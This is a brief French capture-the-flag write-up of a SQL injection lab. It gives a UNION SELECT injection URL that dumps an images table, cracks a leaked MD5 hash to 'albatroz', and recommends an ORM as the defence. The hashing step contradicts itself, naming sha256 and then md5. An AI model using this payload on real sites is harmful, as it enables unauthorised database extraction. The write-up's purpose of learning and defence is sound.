# Sql_1

## Detection des failles

http://192.168.0.10:8080/index.php?page=searchimg&id=1%20AND%201=2%20union%20select%20url,%20comment%20from%20list_images&Submit=Submit#

On va s interesser à cette ligne:
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

en decryptant le md5, on obtient:
albatroz

Il est deja en minuscule ...

On le crypte maintenant en md5


## Comment s'en premunir

Utiliser un ORM (object-relational mapping) en passant par le serveur,
afin qu'il envoi les données sous forme de classe